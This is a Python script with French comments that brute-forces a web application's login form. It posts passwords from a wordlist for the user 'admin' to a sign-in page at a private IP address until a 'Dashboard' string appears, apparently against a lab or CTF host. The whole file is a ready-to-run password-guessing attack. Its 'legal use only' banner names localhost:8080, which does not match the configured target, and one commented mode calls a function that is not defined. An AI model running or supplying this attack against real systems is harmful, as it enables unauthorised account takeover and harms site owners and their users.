import requests
import itertools
import string
import time
from urllib.parse import urljoin
 
# ─────────────────────────────────────────────
# CONFIGURATION
# ─────────────────────────────────────────────
TARGET_URL   = "http://10.11.200.227"
LOGIN_PATH   = "/index.php?page=signin"          # Chemin du formulaire de login
USERNAME     = "admin"           # Nom d'utilisateur cible
FIELD_USER   = "username"        # Nom du champ username dans le formulaire
FIELD_PASS   = "password"        # Nom du champ password dans le formulaire
SUCCESS_TEXT = "Dashboard"       # Texte présent dans la réponse en cas de succès
DELAY        = 0.1               # Délai entre chaque tentative (secondes)
TIMEOUT      = 5                 # Timeout des requêtes (secondes)
 
# ─────────────────────────────────────────────
# MODE 1 : DICTIONNAIRE (wordlist)
# ─────────────────────────────────────────────
def brute_force_wordlist(wordlist_path: str) -> str | None:
    """Teste chaque mot de passe d'un fichier wordlist."""
    url = urljoin(TARGET_URL, LOGIN_PATH)
 
    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[ERREUR] Fichier introuvable : {wordlist_path}")
        return None
 
    print(f"[*] Mode dictionnaire | {len(passwords)} mots de passe | cible : {url}")
 
    for i, password in enumerate(passwords, 1):
        try:
            response = requests.post(
                url,
                data={FIELD_USER: USERNAME, FIELD_PASS: password},
                timeout=TIMEOUT,
                allow_redirects=True,
            )
 
            print(f"  [{i:>5}] Tentative : {password!r:<20} | Statut : {response.status_code}")
 
            if SUCCESS_TEXT in response.text:
                print(f"\n[✓] MOT DE PASSE TROUVÉ : {password!r}")
                return password
 
            time.sleep(DELAY)
 
        except requests.exceptions.ConnectionError:
            print("[ERREUR] Connexion refusée. Le serveur est-il démarré ?")
            return None
        except requests.exceptions.Timeout:
            print(f"[!] Timeout pour le mot de passe : {password!r}")
 
    print("[✗] Mot de passe non trouvé dans le dictionnaire.")
    return None
 


if __name__ == "__main__":
    print("=" * 55)
    print("  BRUTE FORCE TESTER — localhost:8080")
    print("  Usage légal uniquement (vos propres systèmes)")
    print("=" * 55)
    print()
 
    # Choisissez le mode à utiliser :
 
    # ── Mode 1 : wordlist externe (ex: rockyou.txt)
    # result = brute_force_wordlist("wordlist.txt")
 
    # ── Mode 2 : génération exhaustive
    # result = brute_force_generate(charset=string.digits, min_length=4, max_length=4)
 
    # ── Mode 3 : liste personnalisée (défaut)
    result = brute_force_wordlist("pass.txt")
 
    print()
    if result:
        print(f"[RÉSULTAT] Connexion réussie avec : {result!r}")
    else:
        print("[RÉSULTAT] Échec — mot de passe non trouvé.")